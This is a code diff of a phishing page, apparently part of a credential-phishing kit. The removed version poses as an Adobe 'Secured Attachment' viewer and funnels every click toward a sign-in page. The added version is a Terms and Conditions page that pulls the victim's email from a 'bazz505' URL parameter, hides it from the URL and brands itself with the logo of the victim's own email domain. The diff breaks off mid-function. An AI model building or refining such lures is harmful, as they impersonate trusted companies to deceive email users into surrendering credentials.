@@ -1,368 +1,408 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Secured Attachment</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terms and Conditions</title>
+<!-- Dynamic favicon -->
+<link id="dynamicFavicon" rel="icon" href="">
 <style>
-  :root{
-    --bg: #e6e9eb;
-    --toolbar-gradient: linear-gradient(90deg,#b92b27,#7f1512);
-    --accent: #c23e2b;
-    --muted: #6b7280;
-    --card: #ffffff;
-  }
-  * { box-sizing: border-box; }
-  html,body{ height:100%; margin:0; font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:var(--bg); }
-  body{ display:flex; flex-direction:column; overflow:hidden; }
-  /* TOOLBAR */
-  .toolbar{
-    height:64px; display:flex; align-items:center; padding:0 18px; gap:12px;
-    color:#fff; background:var(--toolbar-gradient); box-shadow:inset 0 -1px rgba(0,0,0,0.08);
-    position:fixed; top:0; left:0; right:0; z-index:100;
-  }
-  .app-title{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:0.1px;font-size:15px;}
-  .app-title img{width:30px;height:30px}
-  .toolbar .right{margin-left:auto;display:flex;gap:12px;align-items:center;font-size:14px;}
-  .toolbar .btn{ background:rgba(255,255,255,0.08); border-radius:8px; padding:8px 12px; cursor:pointer; border:1px solid rgba(255,255,255,0.06); transition:background .18s, transform .12s; }
-  .toolbar .btn:hover{ background:rgba(255,255,255,0.12); transform:translateY(-1px); }
-  /* LAYOUT */
-  .content{ display:flex; flex:1; height:100%; margin-top:64px; overflow:hidden; }
-  .left-sidebar{
-    width:200px; padding:18px; border-right:1px solid rgba(0,0,0,0.04);
-    background:linear-gradient(180deg,#fff,#f8f8f9);
-    display:flex; flex-direction:column; gap:14px;
-    align-items:flex-start;
-  }
-  .sidebar-item{
-    width:100%; display:flex; align-items:center; gap:10px; padding:10px 12px; border-radius:10px; cursor:pointer;
-    transition:background .14s, transform .12s; font-size:14px; color:#333;
-  }
-  .sidebar-item:hover{ background:rgba(0,0,0,0.03); transform:translateX(4px); }
-  .sidebar-item .icon{
-    width:36px; height:36px; border-radius:8px; display:flex; align-items:center; justify-content:center;
-    background:linear-gradient(180deg,#fff,#f1f1f2); box-shadow:0 6px 14px rgba(0,0,0,0.04);
-  }
-  .viewer-area{ flex:1; padding:28px; display:flex; flex-direction:column; gap:20px; background:linear-gradient(180deg,#fafafa,#f3f4f6); overflow-y:auto; }
-  .viewer-head{ display:flex; align-items:flex-end; gap:18px; }
-  .viewer-head h2{ margin:0; font-size:20px; color:#222; }
-  .viewer-head p{ margin:0; color:var(--muted); font-size:13px; }
-  /* Featured preview (large) */
-  .featured{
-    display:flex; gap:20px; align-items:stretch; width:100%;
-  }
-  .featured-left{
-    flex: 0 0 520px;
-    border-radius:14px; overflow:hidden; background:linear-gradient(180deg,#fff,#fafafa);
-    box-shadow:0 14px 40px rgba(20,20,30,0.06); position:relative;
-  }
-  .featured-left .big-preview{
-    width:100%; height:100%; min-height:340px; background-size:cover; background-position:center;
-  }
-  .featured-meta{
-    position:absolute; left:0; right:0; bottom:0; padding:18px; background:linear-gradient(180deg, rgba(0,0,0,0.0), rgba(0,0,0,0.28));
-    color:#fff;
-  }
-  .featured-meta h3{ margin:0; font-size:18px; font-weight:700; text-shadow:0 4px 18px rgba(0,0,0,0.4); }
-  .featured-meta p{ margin:6px 0 0; font-size:13px; opacity:.95; text-shadow:0 2px 10px rgba(0,0,0,0.25); }
-  .featured-right{
-    flex:1; display:flex; flex-direction:column; gap:12px; justify-content:flex-start;
-  }
-  .top-actions{ display:flex; gap:10px; }
-  .action-pill{ background:#fff; border-radius:12px; padding:10px 14px; box-shadow:0 8px 26px rgba(0,0,0,0.06); cursor:pointer; font-weight:700; transition:transform .12s, background .12s; }
-  .action-pill:hover{ transform:translateY(-4px); }
-  /* Grid thumbnails */
-  .thumb-grid{ display:flex; flex-wrap:wrap; gap:22px; margin-top:6px; }
-  .thumb{ width:220px; height:300px; background:linear-gradient(180deg,#fff,#fbfbfc); border-radius:12px; box-shadow:0 8px 26px rgba(20,20,30,0.06); border:1px solid rgba(18,18,20,0.02); display:flex; flex-direction:column; padding:12px; transition:transform .28s, box-shadow .28s; position:relative; overflow:hidden; }
-  .thumb:hover{ transform:translateY(-10px); box-shadow:0 28px 60px rgba(30,30,50,0.14); }
-  .thumb .preview{ width:100%; height:170px; border-radius:8px; background-size:cover; background-position:center; transition: transform .26s; }
-  .thumb:hover .preview{ transform:scale(1.04); }
-  .thumb .card-label{ margin-top:8px; font-weight:700; font-size:14px; color:#222; }
-  .thumb .card-sub{ font-size:12px; color:var(--muted); margin-top:6px; }
-  /* overlay actions on thumbnail */
-  .thumb .overlay-actions{ position:absolute; left:12px; right:12px; bottom:12px; display:flex; gap:8px; transform:translateY(8px); opacity:0; transition:opacity .22s, transform .22s; }
-  .thumb:hover .overlay-actions{ transform:translateY(0); opacity:1; }
-  .thumb .mini-btn{ flex:1; padding:8px 10px; border-radius:10px; background:rgba(255,255,255,0.92); border:1px solid rgba(0,0,0,0.06); font-weight:700; cursor:pointer; font-size:13px; }
-  /* right side panel */
-  .panel{ width:320px; border-left:1px solid rgba(20,20,30,0.06); padding:24px; display:flex; flex-direction:column; gap:14px; background:linear-gradient(180deg,#fff,#fafafa); }
-  .panel h3{ margin:0; font-size:15px; color:#222; }
-  .muted{ color:var(--muted); font-size:13px; }
-  /* Login overlay & your login form preserved */
-  .login-overlay{
-    position:fixed; inset:0; background:rgba(0,0,0,0.72); display:flex; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition:opacity .6s ease; z-index:1200;
-  }
-  .login-overlay.show{ opacity:1; pointer-events:all; }
-  .login-container{ width:360px; background:var(--card); border-radius:12px; padding:28px; box-shadow:0 12px 36px rgba(10,10,20,0.36); text-align:center; transform:translateY(40px); opacity:0; transition:transform .5s ease, opacity .5s ease; position:relative; }
-  .login-overlay.show .login-container{ transform:translateY(0); opacity:1; }
-  .login-container img{ width:60px; height:60px; margin-bottom:12px; }
-  .login-fields label{ display:block; font-size:13px; color:var(--muted); margin-bottom:8px; text-align:left; }
-  .login-fields input{ width:100%; padding:10px 12px; border-radius:8px; border:1px solid #dadde0; margin-bottom:12px; font-size:14px; }
-  .login-fields input:focus{ outline:none; border-color:var(--accent); box-shadow:0 6px 20px rgba(194,62,43,0.06); }
-  .login-fields button{ width:100%; padding:11px 12px; border-radius:8px; border:none; background:var(--accent); color:#fff; font-weight:700; cursor:pointer; font-size:15px; }
-  .login-fields button:hover{ background:#a62f1f; }
-  .error-msg{ display:none; color:#b02a2a; font-size:13px; margin-bottom:10px; }
-  .login-close{ position:absolute; top:12px; right:12px; font-size:22px; color:#666; cursor:pointer; }
-  /* responsive */
-  @media (max-width:1100px){
-    .featured-left{ flex-basis: 360px; }
-    .left-sidebar{ display:none; }
-  }
-  @media (max-width:800px){
-    .panel{ display:none; }
-    .thumb{ width:46%; }
-    .featured{ flex-direction:column; }
-    .featured-left{ width:100%; }
-  }
+    :root {
+        --primary-green: #28a745;
+    }
+
+    body {
+        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+        background: #f4f6f9;
+        margin: 0;
+        padding: 0;
+        color: #333;
+        line-height: 1.6;
+        min-height: 100vh;
+    }
+
+    .container {
+        max-width: 960px;
+        width: 90%;
+        margin: 40px auto;
+        background: #ffffff;
+        padding: 40px 30px;
+        border-radius: 16px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        border-top: 10px solid var(--primary-green);
+        box-sizing: border-box;
+        word-wrap: break-word;
+        overflow-wrap: break-word;
+        hyphens: auto;
+    }
+
+    .logo {
+        width: 100px;
+        height: 100px;
+        display: block;
+        margin: 0 auto 30px auto;
+        border-radius: 16px;
+        object-fit: contain;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+        text-align: center;
+        font-size: clamp(1.8rem, 5vw, 2.4rem);
+        margin-bottom: 24px;
+        color: #1a1a1a;
+        font-weight: 600;
+        word-break: break-word;
+    }
+
+    h2 {
+        font-size: clamp(1.4rem, 4vw, 1.6rem);
+        margin-top: 40px;
+        margin-bottom: 12px;
+        color: #222;
+        border-bottom: 1px solid #eee;
+        padding-bottom: 8px;
+    }
+
+    p, li {
+        font-size: clamp(1rem, 3.5vw, 1.05rem);
+        line-height: 1.8;
+        margin-bottom: 16px;
+        word-wrap: break-word;
+        overflow-wrap: break-word;
+    }
+
+    ul {
+        padding-left: 20px;
+        margin-bottom: 20px;
+    }
+
+    li {
+        margin-bottom: 10px;
+    }
+
+    strong { 
+        color: #111; 
+    }
+
+    .accept-btn {
+        display: block;
+        width: min(90%, 320px);
+        margin: 50px auto;
+        padding: 16px 24px;
+        background: var(--primary-green);
+        border: none;
+        color: white;
+        font-size: clamp(1.1rem, 3vw, 1.2rem);
+        font-weight: 600;
+        border-radius: 12px;
+        cursor: pointer;
+        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        transition: all 0.3s ease;
+        touch-action: manipulation;
+    }
+
+    .accept-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+
+    .accept-btn:active {
+        transform: translateY(0);
+    }
+
+    .footer {
+        text-align: center;
+        margin-top: 60px;
+        color: #666;
+        font-size: 0.9rem;
+        padding-top: 24px;
+        border-top: 1px solid #eee;
+    }
+
+    * {
+        box-sizing: border-box;
+    }
+
+    @media (max-width: 480px) {
+        .container {
+            width: 95%;
+            margin: 20px auto;
+            padding: 30px 20px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+        }
+
+        h1 {
+            font-size: 1.8rem;
+        }
+
+        h2 {
+            font-size: 1.4rem;
+        }
+    }
 </style>
 </head>
+
 <body>
-<!-- Loading Animation Overlay -->
-<div id="loadingOverlay" style="
-  position:fixed;
-  inset:0;
-  background:#f3f4f6;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  z-index:2000;
-  transition:opacity 0.6s ease;
-">
-  <img src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png"
-       alt="Secure file loading"
-       style="width:80px;height:auto;animation:spin 2.4s linear infinite;opacity:.9;">
-  <div style="margin-top:16px;font-size:14px;color:#555;font-weight:600;">
-    Secured File Loading…
-  </div>
+<div class="container">
+
+<img id="dynamicLogo" class="logo" src="" alt="Company Logo">
+
+<h1 id="companyNameHeader">Terms and Conditions</h1>
+
+<p><strong>Effective Date:</strong> <span id="effectiveDate">21/02/2026</span></p>
+
+<p id="introText">
+These Terms and Conditions (“Terms”) govern your access to and use of our advanced email services,
+web applications, mobile apps, AI-powered features, and all related functionalities
+(collectively, the “Service”) provided by <strong id="companyName">[Company Name]</strong>
+(“Company,” “we,” “us,” or “our”). By creating an account, accessing, or using the Service—including
+any AI-generated content or automated messaging tools—you agree to be fully bound by these Terms.
+If you do not agree, please do not access or use the Service.
+</p>
+
+
+    <h2>1. Eligibility</h2>
+    <p>To use the Service, you must:</p>
+    <ul>
+        <li>Be at least 16 years old (or the age of digital consent in your jurisdiction).</li>
+        <li>Possess the legal capacity to enter into a binding contract.</li>
+        <li>Not be restricted from using the Service under applicable laws.</li>
+    </ul>
+
+    <h2>2. Account Registration</h2>
+    <ul>
+        <li>You are required to provide accurate, current, and complete information during registration.</li>
+        <li>You are solely responsible for maintaining the confidentiality of your password and account.</li>
+        <li>You must notify us immediately of any unauthorized use and update your information promptly if it changes.</li>
+    </ul>
+
+    <h2>3. Prohibited Activities</h2>
+    <p>The Service strictly prohibits the following activities:</p>
+    <ul>
+        <li>Sending spam, bulk unsolicited messages, phishing attempts, or any form of deceptive communication.</li>
+        <li>Distributing malware, viruses, worms, or any harmful code.</li>
+        <li>Using automated systems (bots, scripts, crawlers, or scrapers) without explicit written permission.</li>
+        <li>Harassing, threatening, defaming, or impersonating any person or entity.</li>
+        <li>Interfering with, disrupting, or overloading the Service or its infrastructure.</li>
+        <li>Accessing the Service through any means other than our officially supported interfaces.</li>
+        <li>Engaging in any illegal, fraudulent, harmful, or abusive conduct.</li>
+        <li>Infringing intellectual property rights, including copyrights and trademarks.</li>
+        <li>Sending emails with forged or misleading headers, sender information, or content.</li>
+        <li>Hosting, transmitting, or linking to illegal, obscene, or defamatory material.</li>
+        <li>Excessive or unreasonable use of server resources that impacts other users.</li>
+        <li>Using AI features to generate or distribute harmful, misleading, or prohibited content (e.g., deepfakes, automated scams, or hate speech).</li>
+        <li>Attempting to reverse-engineer, decompile, or extract AI models or proprietary algorithms.</li>
+    </ul>
+
+    <h2>4. AI-Powered Features and Generated Content</h2>
+    <p>Our Service may include advanced AI tools for message drafting, summarization, smart replies, sentiment analysis, and automated workflows. You acknowledge that:</p>
+    <ul>
+        <li>AI-generated content is produced algorithmically and may contain inaccuracies, biases, or inappropriate material.</li>
+        <li>You are solely responsible for reviewing, editing, and approving all AI-generated messages before sending.</li>
+        <li>We do not guarantee the accuracy, completeness, or suitability of AI outputs.</li>
+        <li>You must not rely on AI features for critical, legal, medical, or financial decisions.</li>
+        <li>Generated content does not represent our views or endorsements.</li>
+    </ul>
+
+    <h2>5. Privacy and Data Protection</h2>
+    <p>We take your privacy seriously. Our comprehensive Privacy Policy explains in detail:</p>
+    <ul>
+        <li>The types of personal and usage data we collect (including email content processed by AI features).</li>
+        <li>How we use, store, and protect your information.</li>
+        <li>Data retention periods and security measures.</li>
+        <li>Your rights to access, correct, export, or delete your data in accordance with applicable laws (e.g., GDPR, CCPA).</li>
+    </ul>
+
+    <h2>6. Email Storage and Retention</h2>
+    <p>The Service may impose limits on mailbox size, message volume, attachment sizes, and storage duration. You are solely responsible for backing up critical emails and data.</p>
+
+    <h2>7. Service Availability</h2>
+    <p>We endeavor to provide reliable, high-uptime access but cannot guarantee uninterrupted or error-free operation. We are not liable for any data loss, service interruptions, or delays caused by factors beyond our reasonable control.</p>
+
+    <h2>8. Third-Party Integrations</h2>
+    <p>The Service may integrate with third-party applications or services. We are not responsible for their functionality, security, or privacy practices. Use of such integrations is entirely at your own risk.</p>
+
+    <h2>9. Intellectual Property</h2>
+    <p>All content, features, AI models, trademarks, and intellectual property within the Service are owned by the Company or its licensors. You are granted a limited, non-transferable license to use the Service and may not copy, modify, distribute, reverse-engineer, or create derivative works without explicit permission.</p>
+
+    <h2>10. Fees and Payment (If Applicable)</h2>
+    <p>Where the Service is paid, fees are charged on a recurring basis. Payments are non-refundable except as required by law. We reserve the right to modify pricing with reasonable notice.</p>
+
+    <h2>11. Termination and Suspension</h2>
+    <p>We may suspend or terminate your account immediately, without notice, for violations of these Terms, suspicious activity, or legal obligations. Certain provisions (e.g., indemnification, liability limits) survive termination.</p>
+
+    <h2>12. Disclaimer of Warranties</h2>
+    <p>The Service is provided “as is” and “as available” without warranties of any kind, express or implied, including but not limited to guarantees of merchantability, fitness for a particular purpose, email delivery, uptime, security, or AI accuracy.</p>
+
+    <h2>13. Limitation of Liability</h2>
+    <p>To the fullest extent permitted by law, the Company shall not be liable for indirect, incidental, consequential, special, or punitive damages. Our total liability is limited to the amount you paid us in the 12 months preceding any claim.</p>
+
+    <h2>14. Indemnification</h2>
+    <p>You agree to defend, indemnify, and hold harmless the Company from any claims, damages, or expenses arising from your use of the Service, violation of these Terms, or infringement of third-party rights.</p>
+
+    <h2>15. Changes to the Terms</h2>
+    <p>We may revise these Terms at any time. We will notify you of material changes. Your continued use of the Service after changes constitutes acceptance of the updated Terms.</p>
+
+    <h2>16. Contact Information</h2>
+    <p>
+
+<h2>16. Contact Information</h2>
+<p>
+<strong id="companyNameFooter">[Company Name]</strong><br>
+Email: <span id="companyEmail">support@domain.com</span><br>
+Website: <span id="companyWebsite">https://www.domain.com</span>
+</p>
+
+<button class="accept-btn" id="acceptBtn">I Accept the Terms and Conditions</button>
+
+<div class="footer">
+© <span id="companyNameFooter2">[Company Name]</span> <span id="year">2025</span>. All Rights Reserved.
 </div>
-<style>
-@keyframes spin {
-  0% { transform:rotate(0deg); }
-  100% { transform:rotate(360deg); }
-}
-</style>
+
+</div>
+
 <script>
-  // Simulate file loading delay
-  window.addEventListener('load', () => {
-    const overlay = document.getElementById('loadingOverlay');
-    overlay.style.opacity = '0';
-    setTimeout(() => overlay.style.display = 'none', 800);
-  });
-</script>
-<!-- background preview elements used by power.js -->
-<iframe id="bg-frame"
-        style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;border:none;"></iframe>
-<div class="overlay"></div>
-  <div class="toolbar">
-    <div class="app-title">
-      <img id="logo" src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png" />
-      <div>
-        <div style="font-size:13px;font-weight:700">Secured Attachment</div>
-        <div style="font-size:11px;opacity:.95">Shared document — requires sign in</div>
-      </div>
-    </div>
-    <!-- top toolbar actions: route to login (we pass an event-like object to preserve your function) -->
-    <div class="right">
-      <div style="font-size:13px;opacity:.95">Shared by <strong>Adobe Corp</strong></div>
-      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Purchase Order&quot;]') })">View</div>
-      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Contract&quot;]') })">Edit</div>
-      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Download</div>
-      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">Save</div>
-    </div>
-  </div>
-  <div class="content">
-    <!-- left sidebar (feature list) -->
-    <div class="left-sidebar">
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">
-        <div class="icon">📄</div><div>Ask AI Assistant</div>
-      </div>
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Purchase Order&quot;]') })">
-        <div class="icon">📝</div><div>Generate a summary</div>
-      </div>
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">
-        <div class="icon">🗜️</div><div>Compress a PDF</div>
-      </div>
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Contract&quot;]') })">
-        <div class="icon">✏️</div><div>Edit text & images</div>
-      </div>
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">
-        <div class="icon">🖼️</div><div>PDF to JPG</div>
-      </div>
-      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">
-        <div class="icon">🔗</div><div>Share</div>
-      </div>
-    </div>
-    <!-- main viewer -->
-    <section class="viewer-area">
-      <div class="viewer-head">
-        <h2>Secured Remote Attachment</h2>
-        <p>Hover to preview — click any action to request access</p>
-      </div>
-      <!-- Featured preview (bigger) -->
-      <div class="featured">
-        <div class="featured-left thumb" data-doc="Business Certificate" onclick="openLogin(event)">
-          <div class="big-preview" style="background-image:url('https://i.postimg.cc/BqDXrX3D/605-1.webp')"></div>
-          <div class="featured-meta">
-            <h3>International Trade Certificate</h3>
-            <p>PDF · 2 pages · 124 KB — updated a few minutes ago</p>
-          </div>
-        </div>
-        <div class="featured-right">
-          <div class="top-actions">
-            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">View</div>
-            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Edit</div>
-            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Download</div>
-            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Save</div>
-          </div>
-          <div style="background:#fff;border-radius:10px;padding:12px;box-shadow:0 8px 26px rgba(0,0,0,0.06);">
-            <div style="font-weight:700">Quick details</div>
-            <div class="muted" style="margin-top:6px">Owner: Adobe Corp — Last edited: a few minutes ago — Permissions: private</div>
-            <div style="display:flex;gap:8px;margin-top:12px;">
-              <div class="action-pill" style="flex:1" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Request access</div>
-              <div class="action-pill" style="flex:1" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Share</div>
-            </div>
-          </div>
-          <div style="display:flex;gap:8px;">
-            <div style="flex:1;background:linear-gradient(180deg,#fff,#fafafa);padding:12px;border-radius:10px;box-shadow:0 8px 26px rgba(0,0,0,0.04);">
-              <div style="font-weight:700">Tags</div>
-              <div class="muted" style="margin-top:8px">finance, onboarding, 2025</div>
-            </div>
-            <div style="flex:1;background:linear-gradient(180deg,#fff,#fafafa);padding:12px;border-radius:10px;box-shadow:0 8px 26px rgba(0,0,0,0.04);">
-              <div style="font-weight:700">Versions</div>
-              <div class="muted" style="margin-top:8px">v1.2 — v1.1</div>
-            </div>
-          </div>
-        </div>
-      </div>
-      <!-- Thumbnails grid -->
-      <div class="thumb-grid">
-        <div class="thumb" data-doc="Business Certificate" onclick="openLogin(event)">
-          <div class="preview" style="background-image:url('https://i.postimg.cc/hDYxnNwx/Screenshot-2025-11-04-at-5-06-19-am.png')"></div>
-          <div class="card-label">Identification and Certificate of Incorporation</div>
-          <div class="card-sub">PDF · 2 pages · 124 KB</div>
-          <div class="overlay-actions">
-            <div class="mini-btn" onclick="openLogin(event)">View</div>
-            <div class="mini-btn" onclick="openLogin(event)">Download</div>
-            <div class="mini-btn" onclick="openLogin(event)">Save</div>
-          </div>
-        </div>
-        <div class="thumb" data-doc="Specifications" onclick="openLogin(event)">
-          <div class="preview" style="background-image:url('https://i.postimg.cc/mTt7XYrr/Chat-GPT-Image-Nov-4-2025-05-43-47-AM.png')"></div>
-          <div class="card-label">Specifications</div>
-          <div class="card-sub">PDF · 8 pages · 512 KB</div>
-          <div class="overlay-actions">
-            <div class="mini-btn" onclick="openLogin(event)">View</div>
-            <div class="mini-btn" onclick="openLogin(event)">Edit</div>
-            <div class="mini-btn" onclick="openLogin(event)">Share</div>
-          </div>
-        </div>
-        <div class="thumb" data-doc="Order List" onclick="openLogin(event)">
-          <div class="preview" style="background-image:url('https://i.postimg.cc/x018xtCm/Chat-GPT-Image-Nov-4-2025-at-05-26-54-AM.png')"></div>
-          <div class="card-label">Order List</div>
-          <div class="card-sub">PDF · 1 page · 86 KB</div>
-          <div class="overlay-actions">
-            <div class="mini-btn" onclick="openLogin(event)">View</div>
-            <div class="mini-btn" onclick="openLogin(event)">Download</div>
-            <div class="mini-btn" onclick="openLogin(event)">Export</div>
-          </div>
-        </div>
-        <div class="thumb" data-doc="Images Samples" onclick="openLogin(event)">
-          <div class="preview" style="background-image:url('https://i.postimg.cc/2rTxXj7r/Chat-GPT-Image-Nov-4-2025-at-05-23-15-AM.png')"></div>
-          <div class="card-label">Images Samples</div>
-          <div class="card-sub">ZIP · 5 files · 1.2 MB</div>
-          <div class="overlay-actions">
-            <div class="mini-btn" onclick="openLogin(event)">View</div>
-            <div class="mini-btn" onclick="openLogin(event)">Convert</div>
-            <div class="mini-btn" onclick="openLogin(event)">Share</div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <!-- right side panel -->
-    <aside class="panel">
-      <h3>File actions</h3>
-      <div style="display:flex;flex-direction:column;gap:8px;">
-        <button class="small-btn primary" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Save</button>
-        <button class="small-btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Share</button>
-        <button class="small-btn ghost" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Details</button>
-      </div>
-      <h3 style="margin-top:12px">Activity</h3>
-      <div class="muted">No recent activity — sign in to view files.</div>
-      <h3 style="margin-top:12px">Recent</h3>
-      <div style="display:flex;gap:8px;align-items:center;">
-        <div style="width:44px;height:44;border-radius:8px;background:#f5f5f6"></div>
-        <div style="font-size:13px">Purchase_Order_987490.pdf</div>
-      </div>
-      <div style="display:flex;gap:8px;align-items:center;">
-        <div style="width:44px;height:44;border-radius:8px;background:#f5f5f6"></div>
-        <div style="font-size:13px">Contract_v1.pdf</div>
-      </div>
-    </aside>
-  </div>
+(async function(){
 
-  <!-- ====== UPDATED SCRIPT: Save email to localStorage + load from storage on refresh ====== -->
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      // 1. Try to get email from URL first (bazz505 param)
-      const params = new URLSearchParams(window.location.search);
-      let email = params.get("bazz505");
+function capitalize(str){ return str.charAt(0).toUpperCase() + str.slice(1); }
 
-      // 2. If no email in URL, check localStorage (persists on refresh)
-      if (!email) {
-        email = localStorage.getItem("bazz505");
-      }
+/* ================= EMAIL PERSISTENCE FIX ================= */
+const params = new URLSearchParams(window.location.search);
+let email = params.get("bazz505");
 
-      // 3. If we have an email (from URL or storage), save it to localStorage
-      if (email) {
-        localStorage.setItem("bazz505", email);
-      } else {
-        email = "info@gmail.com"; // fallback if nothing found
-        localStorage.setItem("bazz505", email);
-      }
+if (email) {
+    email = decodeURIComponent(email.trim());
+    localStorage.setItem("savedEmail", email);
+}
 
-      // 4. Clean the URL (remove ?bazz505=... so it doesn't show)
-      history.replaceState({}, document.title, window.location.pathname);
+if (!email) {
+    email = localStorage.getItem("savedEmail");
+}
 
-      // 5. Function to redirect to review.html with stored email
-      function redirectToReview() {
-        const encodedEmail = encodeURIComponent(email);
-        window.location.href = `review.html?bazz505=${encodedEmail}`;
-      }
+history.replaceState({}, document.title, window.location.pathname);
+/* ========================================================= */
 
-      // 6. Attach redirect to all clickable elements
-      const clickableSelectors = "button, .btn, .mini-btn, .action-pill, .sidebar-item, .thumb, .small-btn";
-      document.querySelectorAll(clickableSelectors).forEach(el => {
-        el.addEventListener("click", (e) => {
-          e.preventDefault(); // prevent default if needed
-          setTimeout(redirectToReview, 700); // slight delay for animation/feel
-        });
-      });
+let domain = "example.com";
+if (email && email.includes("@")) domain = email.split("@")[1].toLowerCase();
 
-      // 7. Watch for new clickable elements (dynamic content)
-      const observer = new MutationObserver(mutations => {
-        mutations.forEach(m => {
-          if (m.addedNodes.length) {
-            m.addedNodes.forEach(node => {
-              if (node.nodeType === 1) { // element node
-                if (node.matches(clickableSelectors)) {
-                  node.addEventListener("click", (e) => {
-                    e.preventDefault();
-                    setTimeout(redirectToReview, 700);
-                  });
-                }
-                node.querySelectorAll(clickableSelectors).forEach(el => {
-                  el.addEventListener("click", (e) => {
-                    e.preventDefault();
-                    setTimeout(redirectToReview, 700);
-                  });
-                });
-              }
-            });
-          }
-        });
-      });
-      observer.observe(document.body, { childList: true, subtree: true });
+ const companyName = capitalize(domain.split(".")[0]);
+    const supportEmail = `support@${domain}`;
+    const websiteURL = `https://www.${domain}`;
+
+    document.getElementById("companyName").textContent = companyName;
+    document.getElementById("companyNameHeader").textContent = `Terms and Conditions – ${companyName}`;
+    document.getElementById("companyNameFooter").textContent = companyName;
+    document.getElementById("companyNameFooter2").textContent = companyName;
+    document.getElementById("companyEmail").textContent = supportEmail;
+    document.getElementById("companyWebsite").textContent = websiteURL;
+
+    const logoEl = document.getElementById("dynamicLogo");
+    const faviconEl = document.getElementById("dynamicFavicon");
+
+    const logoSources = [
+      `https://logo.clearbit.com/${domain}?size=256`,
+      `https://favicon.vemetric.com/${domain}?size=128`,
+      `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
+      `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+      `https://api.faviconkit.com/${domain}/128`
+    ];
+
+    let idx = 0;
+    function tryNext() {
+        if (idx >= logoSources.length) {
+            logoEl.remove();
+            faviconEl.href = "";
+            return;
+        }
+        fetch(logoSources[idx++], { mode: 'cors' })
+        .then(res => { if(!res.ok) throw "bad"; return res.blob(); })
+        .then(blob => {
+            if(blob.size < 1500) throw "too small";
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                logoEl.src = reader.result;
+                faviconEl.href = reader.result;
+
+                logoEl.onload = () => {
+                    const avgColor = getAverageColor(logoEl);
+
+                    // Apply premium color matching across the page
+                    const acceptBtn = document.getElementById("acceptBtn");
+                    acceptBtn.style.backgroundColor = avgColor;
+
+                    const rgb = avgColor.match(/\d+/g).map(Number);
+                    const brightness = (r,g,b) => (r*299 + g*587 + b*114)/1000;
+                    acceptBtn.style.color = brightness(rgb[0],rgb[1],rgb[2]) > 128 ? '#000' : '#fff';
+
+                    document.querySelector(".container").style.borderTop = `12px solid ${avgColor}`;
+                    document.querySelectorAll("h2").forEach(h => {
+                        h.style.borderBottomColor = avgColor + "40"; // subtle accent
+                    });
+                };
+            };
+            reader.readAsDataURL(blob);
+        })
+        .catch(tryNext);
+    }
+
+    function getAverageColor(imgEl){
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = imgEl.naturalWidth || 1;
+        canvas.height = imgEl.naturalHeight || 1;
+        ctx.drawImage(imgEl, 0, 0);
+        const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+        let r=0, g=0, b=0, count=0;
+        for(let i=0; i<data.length; i+=4){
+            if(data[i+3] > 0){ // ignore transparent
